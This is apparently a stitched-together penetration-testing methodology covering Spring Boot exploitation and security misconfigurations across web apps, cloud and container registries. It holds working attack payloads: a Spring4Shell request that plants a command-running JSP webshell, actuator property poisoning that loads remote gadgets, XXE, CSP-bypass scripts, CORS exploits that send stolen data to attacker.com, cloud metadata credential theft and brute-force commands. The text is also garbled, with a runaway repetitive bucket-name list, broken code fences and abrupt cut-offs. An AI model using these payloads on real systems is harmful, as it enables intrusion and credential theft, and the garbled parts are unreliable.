## Phase 5c — Writable `/env` -> `/refresh` gadget RCE
When `/actuator/env` accepts POST and `/actuator/refresh` exists, poison a property then reload:
```bash

# logback JNDI:
curl -s -X POST "$BASE/actuator/env" -H "Content-Type: application/json" -d '{"name":"logging.config","value":"http://$COLLAB/logback.xml"}'

# Eureka XStream deserialization:
curl -s -X POST "$BASE/actuator/env" -H "Content-Type: application/json" -d '{"name":"eureka.client.serviceUrl.defaultZone","value":"http://$COLLAB/x"}'
curl -s -X POST "$BASE/actuator/refresh"
```
(Veracode: Exploiting Spring Boot Actuators.)

# Detection: does the app accept class.* parameters?
curl -s "https://$TARGET/api/user" \
  -d "class.module.classLoader.URLs[0]=jar:http://COLLAB_HOST/test.jar!/"

# Exploitation: write webshell via class loader
curl -s "https://$TARGET/login" \
  --data-raw "username=test&password=test&class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di+if(%22j%22.equals(request.getParameter(%22pwd%22)))%7B+java.io.InputStream+in+%3D+Runtime.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B+int+a+%3D+-1%3B+byte%5B%5D+b+%3D+new+byte%5B2048%5D%3B+while((a%3Din.read(b))!%3D-1)%7B+out.println(new+String(b))%3B+%7D+%7D+%25%7Bsuffix%7Di&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps%2FROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix=shell&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat="
```

---

# Jolokia provides HTTP access to JMX MBeans
curl -s "https://$TARGET/jolokia" | python3 -m json.tool 2>/dev/null | head -20
curl -s "https://$TARGET/actuator/jolokia" | python3 -m json.tool 2>/dev/null | head -20

# List all MBeans
curl -s "https://$TARGET/jolokia/list" | python3 -m json.tool 2>/dev/null | grep -i "type\|operation" | head -30

# Read system properties via Jolokia (may expose credentials)
curl -s "https://$TARGET/jolokia/read/java.lang:type=Runtime/SystemProperties" | \
  python3 -m json.tool 2>/dev/null | grep -i "password\|secret\|key"

# Exec MBean operations (potential RCE via MLet)
curl -s "https://$TARGET/jolokia/exec/com.sun.management:type=DiagnosticCommand/compilerDirectivesAdd/!/tmp/evil"
```

---

## Chain Table

| Spring Boot finding | Chain to | Impact |
|--------------------|----------|--------|
| `/actuator/heapdump` | Extract DB passwords, API keys from memory | Critical credential exfil |
| `/actuator/env` | Read all env vars including secrets | High |
| H2 console accessible | CREATE ALIAS → RCE | Critical |
| SpEL injection | `T(Runtime).exec()` → OS command | Critical RCE |
| Spring4Shell | Write webshell → RCE | Critical |
| Jolokia + MLet | Remote code via MBean | Critical RCE |

---

## Validation

✅ Heap dump: strings command extracts readable passwords/tokens from .hprof file
✅ Actuator/env: secrets visible in JSON response
✅ SpEL: arithmetic expression evaluates (7*7=49) or OOB callback received
✅ H2 console: SQL executed, `id` output returned

**Severity:**
- Heapdump with credentials: Critical
- SpEL RCE: Critical
- H2 console RCE: Critical
- Actuator env (passwords exposed): High
- Mappings disclosure only: Low-Medium


## SOURCE: normal-skills/security-misconfigurations.md

name: security-misconfigurations
description: Comprehensive security misconfiguration testing methodology covering default credentials, directory listing, HTTP security headers, cloud misconfigurations (AWS/Azure/GCP), version control exposure, CI/CD pipeline vulnerabilities, and container registry leaks with optimized detection workflows and exploitation chains.
version: 1.0.0
---

## Overview

Security Misconfigurations represent one of the most prevalent vulnerability classes across modern applications and infrastructure. They occur when systems, frameworks, platforms, or cloud resources are deployed with insecure default settings, unnecessary features enabled, or missing hardening configurations. Unlike code-level vulnerabilities, misconfigurations often expose entire attack surfaces without requiring complex exploitation techniques.

**Core Categories:**
- **Default Configurations:** Factory settings, sample apps, default credentials left unchanged
- **Information Disclosure:** Verbose errors, directory listings, backup files, source code leaks
- **Missing Security Controls:** Absent HTTP security headers, weak TLS configurations, missing patches
- **Cloud Misconfigurations:** Publicly exposed storage, overprivileged IAM, exposed metadata services
- **Version Control Exposure:** Accessible `.git/`, `.svn/`, `.hg/` directories leaking source code
- **CI/CD Vulnerabilities:** Exposed build pipelines, runner poisoning, artifact leakage

**Common Root Causes:**
- Rapid deployment without security review
- Infrastructure-as-Code templates with insecure defaults
- Lack of automated configuration scanning
- Shadow IT and unmanaged cloud resources
- Dev/Test environments exposed to production networks
- Missing patch management and lifecycle processes

---

### 1.1 Technology Fingerprinting
Identify the technology stack to target misconfiguration checks:

**Server & Framework Detection:**
```

# Banner grabbing and header analysis
curl -I https://target.com | grep -i "server\|x-powered-by\|via"
whatweb -a 3 https://target.com
wappalyzer https://target.com

# Common revealing headers
Server: Apache/2.4.41 (Ubuntu)
X-Powered-By: PHP/7.4.3
X-AspNet-Version: 4.0.30319
X-Generator: Drupal 8
X-Runtime: Rails
X-Frame-Options: SAMEORIGIN (reveals framework concern)

# Framework-specific paths
/rails/info/routes
/WEB-INF/web.xml
/META-INF/MANIFEST.MF
/wp-content/ (WordPress)
/administrator/ (Joomla)
/sites/default/ (Drupal)
```

**Service Version Enumeration:**
```

# Aggressive scan with scripts
nmap -sC -sV -p- --script=http-title,http-server-header,http-enum target.com

# Shodan queries
hostname:target.com
http.component:"Apache Tomcat"
http.component:"Jenkins"
http.component:"Swagger UI"
http.title:"phpMyAdmin"
```

### 1.2 Subdomain & Asset Discovery
Map the full attack surface including dev/staging environments:

```

# Subdomain enumeration
subfinder -d target.com -all
amass enum -d target.com -passive
assetfinder --subs-only target.com
findomain -t target.com

# Certificate transparency
crtsh target.com
censys search "services.tls.certificates.leaf_data.subject.common_name: target.com"

# Azure: Search for storage accounts
Invoke-EnumerateAzureBlobs -BaseName target
```

### 1.3 Environment Differentiation
Identify development, staging, and production environments:

**Naming Conventions:**
```
dev.target.com
staging.target.com
test.target.com
uat.target.com
qa.target.com
preview.target.com
beta.target.com
alpha.target.com
demo.target.com
sandbox.target.com
internal.target.com
admin.target.com
api.target.com
api-dev.target.com
api-staging.target.com
```

**Indicators of Non-Production:**
- Self-signed or expired SSL certificates
- Verbose error messages with stack traces
- Debug endpoints enabled (`/debug`, `/console`)
- Swagger/OpenAPI docs exposed
- CORS allowing `*`
- Missing security headers
- Different technology versions than production
- Exposed monitoring endpoints (`/metrics`, `/health`, `/actuator`)

---

### 2.1 Default Credential Testing
Test for unchanged default credentials across all services:

**Common Default Credentials:**
```

# Web Applications
admin/admin
admin/password
admin/123456
administrator/administrator
root/root
root/toor
root/password
user/user
test/test
guest/guest

# Databases
root/ (MySQL empty)
postgres/postgres
sa/ (MSSQL)
mongodb/mongodb
admin/passw0rd

# Network Devices
admin/admin
cisco/cisco
admin/cisco
root/calvin (Dell iDRAC)
administrator/password

# Application Servers
tomcat/tomcat
manager/manager
admin/ (Tomcat blank)
jboss/jboss
admin/jboss

# CMS Platforms
admin/admin (WordPress, Joomla)
administrator/administrator (Joomla)
admin/123456 (Drupal)
admin/opencart (OpenCart)

# Cloud Platforms
admin/ (AWS default no password)
azureuser/ (Azure VM)
ec2-user/ (AWS EC2)

# IoT/Industrial
admin/1234
admin/12345
admin/0000
root/12345
service/service
```

**Automated Default Credential Testing:**
```bash

# Using ncrack for services
ncrack -vv -U users.txt -P passwords.txt ssh://target.com
ncrack -U users.txt -P passwords.txt rdp://target.com
ncrack -U users.txt -P passwords.txt ftp://target.com

# Using hydra for web forms
hydra -L users.txt -P passwords.txt target.com http-post-form "/login:username=^USER^&password=^PASS^:Invalid"

# Using patator for flexibility
patator http_fuzz url=https://target.com/login method=POST body='username=FILE0&password=FILE1' 0=users.txt 1=passwords.txt -x ignore:fgrep='Invalid'

# Grep extract: "Welcome" or "Dashboard"
```

**Vendor-Specific Default Lists:**
```

# Apache Tomcat
tomcat:tomcat
admin:admin
tomcat:s3cret
admin: (blank)
role1:tomcat
both:tomcat
j2deployer:j2deployer
ovwebusr:OvW*busr1
cxsdk:kdsxc

# Elasticsearch
No auth by default in older versions
elastic:changeme (default in some distributions)

### 2.2 Default Pages & Endpoints
Discover exposed default installations and sample applications:

**Common Default Endpoints:**
```

# PHP
/phpinfo.php
/phpinfo
/info.php
/i.php
/test.php
/phpmyadmin/
/pma/
/adminer.php

# Apache
/server-status
/server-info
/manual/
/icons/
/cgi-bin/
/cgi-bin/test-cgi

# Tomcat
/manager/html
/manager/status
/host-manager/html
/examples/
/docs/
/RELEASE-NOTES.txt

# Jenkins
/script
/scriptText
/credentials/
/configure
/systemInfo
/env-vars.html

# Spring Boot
/actuator
/actuator/health
/actuator/info
/actuator/env
/actuator/configprops
/actuator/metrics
/actuator/loggers
/actuator/threaddump
/actuator/heapdump
/actuator/httptrace
/actuator/mappings
/actuator/beans
/actuator/auditevents
/actuator/caches
/actuator/conditions
/actuator/shutdown (DANGEROUS)
/actuator/jolokia
/actuator/changelog

# Swagger/OpenAPI
/swagger-ui.html
/swagger-ui/
/swagger.json
/swagger.yaml
/api-docs
/api-docs/
/v2/api-docs
/v3/api-docs
/openapi.json
/openapi.yaml
/api/swagger.json
/explorer/
/api/explorer/

# WordPress
/wp-admin/
/wp-login.php
/wp-content/
/wp-includes/
/xmlrpc.php
/wp-config.php
/readme.html

# cPanel/WHM
/cpanel
/whm
/webmail
/roundcube
/phpMyAdmin
```

**Sample Application Detection:**
```

# Apache Tomcat Examples
/examples/servlets/
/examples/jsp/
/examples/websocket/

### 2.3 Debug Mode & Verbose Error Detection
Identify applications running in debug/development mode:

**Debug Indicators:**
```

# Django
DEBUG = True
- Yellow error pages with full stack traces
- SQL queries displayed
- Static files served by Django (not nginx)

# Flask
app.debug = True
- Werkzeug interactive debugger (PIN protected but bypassable)

# Rails
config.consider_all_requests_local = true
- Full error traces in production

# Laravel
APP_DEBUG=true
- Whoops error pages with stack traces
- Environment variables exposed

# ASP.NET
<customErrors mode="Off"/>
- Yellow Screen of Death (YSOD)
- Full stack traces with source code lines

# Node.js/Express
- Raw error objects sent as JSON
- Stack traces in API responses
```

**Error-Based Information Extraction:**
```

# Invalid JSON to trigger parser errors
POST /api/login
Content-Type: application/json
Body: {invalid json

# Invalid XML to trigger parser errors
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<foo>&xxe;</foo>

# Path traversal to trigger file not found with path disclosure
../../../nonexistent

### 3.1 Directory Listing Detection
Identify servers with directory indexing enabled:

**Detection Techniques:**
```

# Direct browsing
curl -s https://target.com/images/ | grep -i "index of\|directory listing"
curl -s https://target.com/assets/ | grep "Parent Directory"

# Common paths with directory listing
/uploads/
/images/
/files/
/documents/
/backup/
/old/
/test/
/tmp/
/temp/
/cache/
/logs/
/data/
/config/
/scripts/
/css/
/js/
/fonts/
/media/
/static/
/resources/
/downloads/
/exports/
/reports/
```

**Apache Directory Listing Signatures:**
```
<title>Index of /path</title>
<h1>Index of /path</h1>
<table><tr><th><img src="/icons/blank.gif" alt="[ICO]"></th>
Parent Directory</a>
```

**Nginx Directory Listing Signatures:**
```
<title>Index of /path</title>
<body bgcolor="white">
<h1>Index of /path</h1><hr><pre><a href="../">../</a>
```

**IIS Directory Listing Signatures:**
```
<body><h1>Contents of directory</h1>
<pre><A HREF="..">[To Parent Directory]</A>
```

### 3.2 Sensitive File & Backup Discovery
Hunt for exposed backup files, source code, and configuration:

**Common Backup Extensions:**
```

# Editor backups
file.php~
file.php.bak
file.php.old
file.php.orig
file.php.save
file.php.swp
file.php.swo
file.php~1
file.php_1
file.php.1
file.php.copy
file.php.tmp
file.php.temp
file.php.bkp
file.php.bak1
file.php.bak2
file.php.2023
file.php.2024
file.php.2025
file.php.last
file.php.previous
file.php.backup
file.php.original
file.php.dist
file.php.default
file.php.sample
file.php.example
file.php.dev
file.php.local
file.php.staging
file.php.prod
file.php.production

# Archive files
backup.zip
backup.tar.gz
backup.tgz
backup.rar
backup.7z
backup.sql
backup.sql.gz
dump.sql
database.sql
db.sql
backup_db.sql
site_backup.zip
www.zip
www.tar.gz
html.zip
public_html.zip
source.zip
code.zip
project.zip
archive.zip
old.zip
temp.zip

# Version control
.git/
.gitignore
.gitattributes
.gitconfig
.svn/
.svn/entries
.svn/wc.db
.hg/
.hgignore
.bzr/
CVS/

# Configuration files
.env
.env.local
.env.production
.env.staging
.env.development
.env.backup
config.php
config.inc.php
configuration.php
settings.php
database.php
db.php
wp-config.php
wp-config.php.bak
config.yml
config.yaml
config.json
config.xml
config.ini
config.dist.php
web.config
web.config.bak
application.ini
parameters.yml
secrets.yml
credentials.json
serviceAccount.json
firebase-config.json
aws-config.json
docker-compose.yml
docker-compose.override.yml
Dockerfile
.vscode/settings.json
.idea/workspace.xml

# Log files
access.log
access_log
error.log
error_log
debug.log
application.log
server.log
apache.log
nginx.log
php_error.log
mysql.log
postgres.log
mail.log
cron.log
auth.log
secure.log
audit.log
trace.log

# Temporary files
temp/
tmp/
cache/
sessions/
uploads/
files/
```

**Automated Backup Discovery:**
```bash

# Using ffuf for backup file discovery
ffuf -u https://target.com/FUZZ -w backup-extensions.txt \
  -mc 200,301,302 -t 100

# Using dirsearch
python3 dirsearch.py -u https://target.com -e php,bak,old,zip,tar.gz,sql,txt,xml,json,yml

# Using gobuster
gobuster dir -u https://target.com -w wordlist.txt -x php,bak,old,zip,tar,sql,txt

# Using feroxbuster
feroxbuster -u https://target.com -w wordlist.txt -x php,bak,old,zip,tar,sql

### 3.3 Source Code Disclosure
Test for server-side source code exposure:

**PHP Source Disclosure:**
```

# If PHP is not executed (misconfigured handler)
https://target.com/index.php~
https://target.com/index.php.bak
https://target.com/index.php.source
https://target.com/index.php.txt
https://target.com/index.php.old

# PHP wrappers
https://target.com/page.php?file=php://filter/convert.base64-encode/resource=index.php
```

**ASP.NET Source Disclosure:**
```

# IIS misconfigurations
https://target.com/web.config
https://target.com/global.asax
https://target.com/global.asax.bak
https://target.com/bin/App.dll
https://target.com/App_Code/
https://target.com/App_Data/

# ViewState decryption (if not properly protected)
https://target.com/__VIEWSTATE
```

**Java Source Disclosure:**
```

# WEB-INF traversal
https://target.com/WEB-INF/web.xml
https://target.com/WEB-INF/classes/
https://target.com/WEB-INF/lib/
https://target.com/META-INF/MANIFEST.MF
https://target.com/META-INF/context.xml

# Spring Boot source
https://target.com/actuator/heapdump (contains memory with source)
```

---

### 4.1 Missing Security Headers
Identify absent headers that weaken security posture:

**Critical Headers to Check:**
```

# Impact: Cross-origin window manipulation
```

**Automated Header Analysis:**
```bash

# Using curl
curl -I -s https://target.com | grep -i "content-security-policy\|strict-transport-security\|x-frame-options\|x-content-type-options\|referrer-policy\|permissions-policy"

# Python script for batch analysis
import requests
headers_to_check = [
    'content-security-policy',
    'strict-transport-security',
    'x-frame-options',
    'x-content-type-options',
    'referrer-policy',
    'permissions-policy',
    'cross-origin-resource-policy',
    'cross-origin-embedder-policy',
    'cross-origin-opener-policy'
]

resp = requests.head('https://target.com')
missing = [h for h in headers_to_check if h not in {k.lower(): v for k, v in resp.headers.items()}]
print(f"Missing headers: {missing}")
```

### 4.2 Content Security Policy (CSP) Weaknesses
Analyze CSP for bypass opportunities:

**Weak Directives:**
```

# Bypass: <script src="https://target.com/api/user?callback=alert"></script>
```

**CSP Bypass Techniques:**
```javascript
// If 'unsafe-inline' is present
<script>alert(document.domain)</script>

// If AngularJS is in allowed sources and unsafe-eval present
ng-app ng-csp ng-click="$event.view.alert(1)"

// If jQuery is allowed
<script src="https://allowed.com/jquery.js"></script>
<script>
$('').attr('src', 'x').on('error', alert)
</script>

// If data: is allowed
<script src="data:text/javascript,alert(1)"></script>

// If blob: is allowed
<script>
var b = new Blob(['alert(1)'], {type: 'text/javascript'});
var u = URL.createObjectURL(b);
var s = document.createElement('script');
s.src = u;
document.body.appendChild(s);
</script>

// If base-uri is missing
<base href="https://attacker.com/">
<script src="/script.js"></script> // Loads from attacker.com

// JSONP exploitation
<script src="https://allowed-domain.com/api/data?callback=alert"></script>

// Angular CSP bypass via ng-app (if Angular is loaded)
<div ng-app ng-csp ng-click="$event.view.alert(1)">click</div>
```

### 4.3 CORS Misconfiguration Deep Analysis
Test for dangerous CORS configurations:

**Vulnerable Patterns:**
```

# Wildcard with credentials (CRITICAL)
Access-Control-Allow-Origin: *
Access-Control-Allow-Credentials: true

# Reflected origin with credentials (CRITICAL)
Access-Control-Allow-Origin: https://attacker.com
Access-Control-Allow-Credentials: true

# Null origin with credentials
Access-Control-Allow-Origin: null
Access-Control-Allow-Credentials: true

# Subdomain trust with credentials
Access-Control-Allow-Origin: https://subdomain.target.com
Access-Control-Allow-Credentials: true

# If pre-flight is not required (simple request), credentials may still work
```

**CORS Exploitation:**
```html
<!-- Wildcard + Credentials -->
<script>
fetch('https://target.com/api/user', {
  credentials: 'include'
})
.then(r => r.json())
.then(data => {
  fetch('https://attacker.com/log?d=' + btoa(JSON.stringify(data)));
});
</script>

<!-- Reflected Origin -->
<!-- Attacker hosts this on attacker.com -->
<script>
fetch('https://target.com/api/sensitive', {
  credentials: 'include'
})
.then(r => r.text())
.then(data => fetch('https://attacker.com/?stolen=' + btoa(data)));
</script>

<!-- Null Origin -->
<iframe sandbox="allow-scripts" srcdoc="
  <script>
    fetch('https://target.com/api/data', {credentials: 'include'})
    .then(r => r.json())
    .then(d => parent.postMessage(d, '*'));
  </script>
"></iframe>
```

**CORS Testing Automation:**
```bash

# Test origin reflection
curl -I -H "Origin: https://evil.com" https://target.com/api/user

# Test subdomain origin
curl -I -H "Origin: https://subdomain.target.com" https://target.com/api/user

### 5.1 AWS Misconfigurations
Comprehensive AWS security testing:

**S3 Bucket Enumeration:**
```bash

# Using awscli (if credentials available)
aws s3 ls s3://target-bucket --no-sign-request
aws s3 ls s3://target-bucket/ --recursive --no-sign-request
aws s3 cp s3://target-bucket/file.txt . --no-sign-request

# Common bucket naming patterns
target
target-backup
target-backups
target-dev
target-staging
target-prod
target-production
target-assets
target-media
target-uploads
target-files
target-data
target-db
target-database
target-logs
target-config
target-secrets
target-cdn
target-static
target-public
target-private
target-internal
target-images
target-docs
target-documents
target-reports
target-exports
target-imports
target-temp
target-tmp
target-archive
target-old
target-legacy
target-app
target-application
target-api
target-web
target-www
target-site
target-website
target-portal
target-admin
target-user
target-users
target-customer
target-client
target-billing
target-payment
target-invoice
target-receipt
target-order
target-orders
target-product
target-products
target-catalog
target-inventory
target-warehouse
target-shipping
target-delivery
target-logistics
target-supply
target-vendor
target-partner
target-reseller
target-affiliate
target-marketing
target-sales
target-finance
target-accounting
target-hr
target-legal
target-compliance
target-security
target-it
target-ops
target-operations
target-engineering
target-devops
target-qa
target-test
target-testing
target-uat
target-sandbox
target-demo
target-poc
target-pilot
target-beta
target-alpha
target-release
target-deploy
target-deployment
target-build
target-ci
target-cd
target-pipeline
target-artifact
target-package
target-registry
target-repo
target-repository
target-git
target-github
target-gitlab
target-bitbucket
target-jira
target-confluence
target-wiki
target-docs
target-documentation
target-kb
target-knowledge
target-support
target-help
target-faq
target-forum
target-community
target-blog
target-news
target-press
target-media
target-pr
target-event
target-events
target-webinar
target-conference
target-summit
target-training
target-education
target-learning
target-course
target-certification
target-exam
target-assessment
target-survey
target-feedback
target-review
target-rating
target-testimonial
target-case
target-study
target-whitepaper
target-report
target-analytics
target-metrics
target-dashboard
target-monitoring
target-alert
target-notification
target-message
target-messaging
target-chat
target-communication
target-collaboration
target-share
target-social
target-network
target-connect
target-integrate
target-integration
target-webhook
target-callback
target-api
target-sdk
target-library
target-framework
target-platform
target-service
target-microservice
target-function
target-lambda
target-serverless
target-container
target-docker
target-kubernetes
target-k8s
target-cluster
target-node
target-instance
target-vm
target-server
target-host
target-machine
target-device
target-iot
target-sensor
target-gateway
target-proxy
target-lb
target-loadbalancer
target-cdn
target-cache
target-redis
target-memcached
target-database
target-db
target-sql
target-nosql
target-mongo
target-postgres
target-mysql
target-mariadb
target-oracle
target-mssql
target-dynamo
target-cosmos
target-firestore
target-bigquery
target-redshift
target-snowflake
target-elastic
target-search
target-index
target-queue
target-kafka
target-rabbit
target-sqs
target-sns
target-eventbridge
target-step
target-state
target-workflow
target-orchestration
target-scheduler
target-cron
target-batch
target-etl
target-pipeline
target-stream
target-realtime
target-websocket
target-socket
target-grpc
target-graphql
target-rest
target-soap
target-xml
target-json
target-yaml
target-toml
target-config
target-configuration
target-setting
target-parameter
target-secret
target-credential
target-key
target-token
target-password
target-auth
target-authentication
target-identity
target-idp
target-sso
target-oauth
target-oidc
target-saml
target-ldap
target-ad
target-directory
target-domain
target-dns
target-route
target-subdomain
target-cname
target-a-record
target-mx
target-mail
target-email
target-smtp
target-imap
target-pop
target-exchange
target-office
target-gmail
target-outlook
target-calendar
target-schedule
target-meeting
target-video
target-conference
target-zoom
target-teams
target-slack
target-discord
target-telegram
target-whatsapp
target-signal
target-sms
target-phone
target-voice
target-call
target-contact
target-address
target-location
target-map
target-gps
target-geo
target-region
target-zone
target-area
target-country
target-state
target-city
target-zip
target-postal
target-address
target-street
target-building
target-floor
target-room
target-desk
target-workspace
target-office
target-cowork
target-remote
target-home
target-personal
target-private
target-confidential
target-sensitive
target-classified
target-public
target-open
target-free
target-trial
target-demo
target-sample
target-example
target-template
target-boilerplate
target-starter
target-seed
target-init
target-setup
target-install
target-configure
target-deploy
target-release
target-version
target-v1
target-v2
target-v3
target-api-v1
target-api-v2
target-legacy
target-old
target-deprecated
target-retired
target-archive
target-historical
target-backup
target-snapshot
target-restore
target-recovery
target-disaster
target-dr
target-failover
target-ha
target-cluster
target-replica
target-primary
target-master
target-slave
target-worker
target-node
target-agent
target-client
target-consumer
target-producer
target-publisher
target-subscriber
target-listener
target-watcher
target-observer
target-monitor
target-tracker
target-logger
target-reporter
target-auditor
target-scanner
target-probe
target-check
target-test
target-verify
target-validate
target-confirm
target-approve
target-authorize
target-permit
target-allow
target-grant
target-deny
target-block
target-reject
target-forbid
target-ban
target-blacklist
target-whitelist
target-allowlist
target-denylist
target-filter
target-rule
target-policy
target-standard
target-baseline
target-template
target-pattern
target-model
target-schema
target-definition
target-spec
target-specification
target-requirement
target-compliance
target-regulation
target-governance
target-risk
target-threat
target-vulnerability
target-exposure
target-weakness
target-issue
target-bug
target-defect
target-error
target-fault
target-failure
target-crash
target-down
target-outage
target-incident
target-event
target-alert
target-warning
target-notice
target-info
target-debug
target-trace
target-log
target-history
target-audit
target-record
target-evidence
target-proof
target-verification
target-certification
target-accreditation
target-attestation
target-assurance
target-guarantee
target-warranty
target-sla
target-agreement
target-contract
target-terms
target-policy
target-procedure
target-process
target-workflow
target-playbook
target-runbook
target-guide
target-manual
target-handbook
target-reference
target-documentation
target-docs
target-help
target-support
target-assist
target-service
target-care
target-success
target-happy
target-satisfaction
target-nps
target-feedback
target-survey
target-review
target-rating
target-score
target-rank
target-grade
target-level
target-tier
target-plan
target-package
target-bundle
target-offer
target-deal
target-promo
target-discount
target-coupon
target-voucher
target-code
target-gift
target-reward
target-loyalty
target-points
target-credit
target-balance
target-wallet
target-account
target-profile
target-user
target-member
target-customer
target-client
target-patient
target-student
target-teacher
target-employee
target-employer
target-manager
target-director
target-executive
target-officer
target-board
target-committee
target-team
target-group
target-org
target-organization
target-company
target-corp
target-corporation
target-inc
target-ltd
target-llc
target-gmbh
target-sarl
target-sa
target-pty
target-limited
target-holdings
target-ventures
target-capital
target-partners
target-associates
target-alliance
target-consortium
target-federation
target-union
target-guild
target-society
target-club
target-circle
target-network
target-hub
target-center
target-centre
target-institute
target-academy
target-school
target-university
target-college
target-campus
target-lab
target-laboratory
target-research
target-rd
target-innovation
target-technology
target-tech
target-software
target-hardware
target-firmware
target-chip
target-circuit
target-board
target-device
target-gadget
target-tool
target-instrument
target-equipment
target-machine
target-robot
target-drone
target-vehicle
target-car
target-truck
target-van
target-bike
target-scooter
target-motor
target-engine
target-motor
target-turbine
target-generator
target-battery
target-solar
target-wind
target-energy
target-power
target-electric
target-grid
target-utility
target-water
target-gas
target-oil
target-fuel
target-chemical
target-material
target-metal
target-mineral
target-ore
target-mine
target-quarry
target-pit
target-well
target-rig
target-platform
target-refinery
target-plant
target-factory
target-mill
target-works
target-shop
target-store
target-warehouse
target-depot
target-yard
target-dock
target-port
target-terminal
target-station
target-hub
target-center
t
[... truncated for digest; original source remains in the source folder ...]

# Download files
aws s3 cp s3://bucket-name/file.txt . --no-sign-request
aws s3 sync s3://bucket-name ./local-dir --no-sign-request

# Check bucket policy
aws s3api get-bucket-policy --bucket bucket-name --no-sign-request

# Check bucket ACL
aws s3api get-bucket-acl --bucket bucket-name --no-sign-request

# Check CORS configuration
aws s3api get-bucket-cors --bucket bucket-name --no-sign-request

# Check versioning
aws s3api get-bucket-versioning --bucket bucket-name --no-sign-request

# List object versions (if versioning enabled)
aws s3api list-object-versions --bucket bucket-name --no-sign-request

# Check website configuration
aws s3api get-bucket-website --bucket bucket-name --no-sign-request

# Check encryption
aws s3api get-bucket-encryption --bucket bucket-name --no-sign-request

# Check public access block
aws s3api get-public-access-block --bucket bucket-name --no-sign-request

# Check lifecycle policies
aws s3api get-bucket-lifecycle-configuration --bucket bucket-name --no-sign-request

# Check logging
aws s3api get-bucket-logging --bucket bucket-name --no-sign-request

# Check notification
aws s3api get-bucket-notification-configuration --bucket bucket-name --no-sign-request

# Check replication
aws s3api get-bucket-replication --bucket bucket-name --no-sign-request

# Check tagging
aws s3api get-bucket-tagging --bucket bucket-name --no-sign-request

# Check location
aws s3api get-bucket-location --bucket bucket-name --no-sign-request

# Check ownership controls
aws s3api get-bucket-ownership-controls --bucket bucket-name --no-sign-request
```

**EC2 Metadata Service (IMDSv1) SSRF:**
```bash

# If SSRF exists, access metadata endpoint
curl http://169.254.169.254/latest/meta-data/
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME
curl http://169.254.169.254/latest/user-data/

# Some services proxy headers, allowing IMDSv2 token acquisition
curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600"
curl -H "X-aws-ec2-metadata-token: TOKEN" http://169.254.169.254/latest/meta-data/

# Cloud-init data
curl http://169.254.169.254/latest/meta-data/public-keys/0/openssh-key
```

**AWS Lambda Enumeration:**
```bash

# List functions (requires credentials)
aws lambda list-functions --region us-east-1

# Check environment variables
aws lambda get-function-configuration --function-name target-function

# List event source mappings
aws lambda list-event-source-mappings
```

**IAM Policy Analysis:**
```bash

# Get role policies
aws iam list-role-policies --role-name ROLE_NAME
aws iam get-role-policy --role-name ROLE_NAME --policy-name POLICY_NAME

# List attached policies
aws iam list-attached-user-policies --user-name USERNAME
aws iam list-attached-role-policies --role-name ROLE_NAME

### 5.2 Azure Misconfigurations
Test for Azure-specific misconfigurations:

**Azure Storage Account Testing:**
```bash

# Using Azure CLI
az storage blob list --account-name targetstorage --container-name public --auth-mode login

# Anonymous access test
curl https://targetstorage.blob.core.windows.net/public/
curl https://targetstorage.blob.core.windows.net/public/file.txt

# File share access
curl https://targetstorage.file.core.windows.net/share-name/

# Queue storage
curl https://targetstorage.queue.core.windows.net/
```

**SAS Token Exposure:**
```

# SAS token format:
?sv=2020-08-04&ss=bfqt&srt=sco&sp=rwdlacupx&se=2025-01-01&st=2024-01-01&spr=https&sig=BASE64SIG

# sp=r (read), w (write), d (delete), l (list), a (add), c (create), u (update), p (process), x (execute)

# List secrets (requires access)
az keyvault secret list --vault-name target-vault

# Get secret value
az keyvault secret show --name DB_PASSWORD --vault-name target-vault

# Get function keys
az functionapp function keys list --name target-func --resource-group RG

# Check app settings (often contain secrets)
az functionapp config appsettings list --name target-func --resource-group RG
```

### 5.3 GCP Misconfigurations
Test for Google Cloud Platform misconfigurations:

**GCP Storage Bucket Testing:**
```bash

# Using gsutil
gsutil ls gs://target-bucket/
gsutil ls -r gs://target-bucket/
gsutil cp gs://target-bucket/file.txt .

# Using curl
curl https://storage.googleapis.com/target-bucket/
curl https://storage.googleapis.com/target-bucket/file.txt

# Check retention
gsutil retention get gs://target-bucket/
```

**GCP Cloud Functions:**
```bash

# Check environment variables
gcloud functions describe target-function --format="value(environmentVariables)"

# Get function source
gcloud functions source-gen-download target-function --destination=./source
```

**GCP Compute Metadata:**
```bash

# Metadata endpoint (similar to AWS)
curl http://metadata.google.internal/computeMetadata/v1/ -H "Metadata-Flavor: Google"
curl http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token -H "Metadata-Flavor: Google"
curl http://metadata.google.internal/computeMetadata/v1/project/attributes/ssh-keys -H "Metadata-Flavor: Google"
```

### 5.4 Container Registry Exposure
Test for publicly exposed container images:

**Amazon ECR:**
```bash

# List repositories (requires auth, but test for public)
aws ecr describe-repositories --region us-east-1

# Check repository policy for public access
aws ecr get-repository-policy --repository-name target-repo

# Pull image (if public or compromised credentials)
aws ecr get-login-password | docker login --username AWS --password-stdin ACCOUNT.dkr.ecr.REGION.amazonaws.com
docker pull ACCOUNT.dkr.ecr.REGION.amazonaws.com/target-repo:latest

# Scan image for secrets
docker run --rm -v /var/run/docker.sock:/var/run/docker.sock trufflesecurity/trufflehog docker ACCOUNT.dkr.ecr.REGION.amazonaws.com/target-repo:latest
```

**Azure Container Registry:**
```bash

# Login and pull
az acr login --name targetregistry
docker pull targetregistry.azurecr.io/target-image:latest

# Check for anonymous pull
docker pull targetregistry.azurecr.io/target-image:latest

# (without login - should fail if properly configured)
```

**Google Container Registry / Artifact Registry:**
```bash

# Pull image
docker pull gcr.io/project-id/target-image:latest
docker pull us-docker.pkg.dev/project-id/repo/target-image:latest

# Check IAM policy
gcloud artifacts repositories get-iam-policy repo-name --location=us-central1
```

**Container Image Secret Extraction:**
```bash

# Pull and inspect image
docker pull target-image:latest
docker save target-image:latest -o image.tar
tar -xf image.tar

# Check layers for secrets
for layer in */layer.tar; do
